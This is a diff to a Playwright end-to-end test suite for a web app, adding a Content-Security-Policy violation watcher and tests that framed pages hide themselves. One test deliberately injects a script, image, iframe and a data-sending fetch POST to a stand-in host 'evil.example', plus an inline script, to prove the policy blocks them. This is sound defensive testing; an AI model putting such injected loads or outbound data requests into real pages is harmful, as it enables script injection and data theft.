@@ -3,6 +3,7 @@
 // the staff-admin function (with the function's own rules module).
 // Run: npx http-server -p 8080 -s . &  then  node tests/team-e2e.mjs [outDir]
 import { chromium } from 'playwright';
+import { watchCsp, noCspViolations, cspViolations } from './csp-watch.mjs';
 import assert from 'node:assert/strict';
 import { randomUUID, randomBytes } from 'node:crypto';
 import {
@@ -187,6 +188,7 @@ async function newPage(viewport = { width: 1280, height: 900 }) {
   await ctx.route('https://czncjzziqrqtezpwxxpz.supabase.co/**', withClientColumns(fakeSupabase, CLIENT_SHAPE));
   const page = await ctx.newPage();
   page.on('pageerror', (e) => errors.push(String(e)));
+  watchCsp(page); // a load the Content-Security-Policy refused fails the suite (tests/csp-watch.mjs)
   page.on('console', (msg) => { if (msg.type() === 'error' && !/Failed to load resource/.test(msg.text())) errors.push(msg.text()); });
   page.on('dialog', (d) => d.accept());
   return page;
@@ -636,6 +638,65 @@ await step('a link of another account does not replace the one signed in here wi
   assert.equal(await text(y, '#sp-h'), 'בחירת סיסמה חדשה');
 });
 
+// Security audit, 6.10.2026 (ops.md 36): GitHub Pages cannot forbid framing with a header,
+// so a page shown inside another site's frame hides itself (app/frame-guard.js).
+await step('inside another site\'s frame a page hides itself; on its own it shows', async () => {
+  const ctx = await browser.newContext({ locale: 'he-IL' });
+  await ctx.route('https://czncjzziqrqtezpwxxpz.supabase.co/**', withClientColumns(fakeSupabase, CLIENT_SHAPE));
+  // Another origin on this machine stands in for the other site (the browser lets no far
+  // site frame localhost at all): the same server by its number, a file with no policy of its own.
+  const p = await ctx.newPage();
+  await p.goto(`http://127.0.0.1:${new URL(BASE).port}/package.json`);
+  assert.notEqual(new URL(p.url()).origin, new URL(BASE).origin);
+  await p.evaluate((pages) => {
+    for (const [id, src] of pages) { const f = document.createElement('iframe'); Object.assign(f, { id, src, width: 800, height: 600 }); document.body.append(f); }
+  }, [['f', `${BASE}clients.html`], ['g', `${BASE}q.html#t=x`]]);
+  for (const name of ['clients.html', 'q.html']) {
+    await p.waitForFunction((n) => [...document.querySelectorAll('iframe')].every((f) => f.contentWindow) && !!n, name);
+    let frame = null;
+    for (let i = 0; i < 50 && !frame; i += 1) { frame = p.frames().find((f) => f.url().includes(name)) || null; if (!frame) await p.waitForTimeout(100); }
+    assert.ok(frame, `${name}: the frame loaded`);
+    await frame.waitForLoadState('domcontentloaded');
+    const seen = await frame.evaluate(() => ({ display: getComputedStyle(document.documentElement).display, framed: document.documentElement.hasAttribute('data-framed') }));
+    assert.deepEqual(seen, { display: 'none', framed: true }, name);
+  }
+  // The frame takes no room for a press: nothing of the page is drawn in it.
+  assert.equal(await p.frameLocator('#f').locator('#lg-submit').isVisible(), false);
+  // On its own, the same page is there.
+  const own = await ctx.newPage();
+  await own.goto(`${BASE}clients.html`);
+  await own.waitForSelector('#lg-submit');
+  assert.deepEqual(await own.evaluate(() => ({ display: getComputedStyle(document.documentElement).display, framed: document.documentElement.hasAttribute('data-framed') })), { display: 'block', framed: false });
+  await ctx.close();
+});
+
+// The policy itself, and that a refusal is heard: every suite ends with noCspViolations(),
+// so a page that needs something the policy refuses fails its suite.
+await step('the policy refuses a script, a picture and a request to another site, and code written into the page; the suites hear it', async () => {
+  const p = await newPage();
+  await p.goto(`${BASE}clients.html`);
+  await p.waitForSelector('#lg-submit');
+  const heard = cspViolations.length;
+  const said = errors.length;
+  const got = await p.evaluate(() => new Promise((resolve) => {
+    const seen = [];
+    document.addEventListener('securitypolicyviolation', (e) => seen.push(e.violatedDirective.split(' ')[0]));
+    new Image().src = 'https://evil.example/x.png';
+    const far = document.createElement('script'); far.src = 'https://evil.example/x.js'; document.head.append(far);
+    const inline = document.createElement('script'); inline.textContent = 'window.__ran = 1'; document.head.append(inline);
+    fetch('https://evil.example/collect', { method: 'POST', body: 'x' }).catch(() => {});
+    const frame = document.createElement('iframe'); frame.src = 'https://evil.example/'; document.body.append(frame);
+    setTimeout(() => resolve({ seen: [...new Set(seen)].sort(), ran: window.__ran === 1 }), 600);
+  }));
+  assert.deepEqual(got, { seen: ['connect-src', 'frame-src', 'img-src', 'script-src-elem'], ran: false });
+  assert.ok(cspViolations.length >= heard + 4, `the watch heard ${cspViolations.length - heard} refusals`);
+  // These refusals were asked for: they are not the suite's.
+  cspViolations.length = heard;
+  errors.length = said;
+  await p.close();
+});
+
 await browser.close();
+noCspViolations();
 assert.deepEqual(errors, []);
 console.log(`team-e2e: ${passed} passed`);
